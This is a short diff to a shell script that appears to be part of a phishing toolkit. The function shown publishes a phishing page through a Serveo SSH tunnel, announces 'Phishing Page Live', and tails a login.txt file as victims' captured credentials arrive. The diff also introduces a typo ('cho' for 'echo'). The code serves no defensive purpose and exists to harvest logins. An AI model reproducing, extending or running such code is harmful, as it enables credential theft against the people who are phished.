@@ -44,9 +44,11 @@ start_serveo() {
     else
         echo -e "${RED}[!] Failed to get Serveo URL. Check SSH connection.${NC}"
     fi
-
-    # Live credential view (optional)
-    tail -f creds.txt 2>/dev/null
+    
+#live credentials 
+    cho -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL${NC}"
+echo -e "${YEL}[!] Waiting for credentials... (Press CTRL + C to exit)${NC}"
+tail -f login.txt 2>/dev/null
 }
 
 # Menu
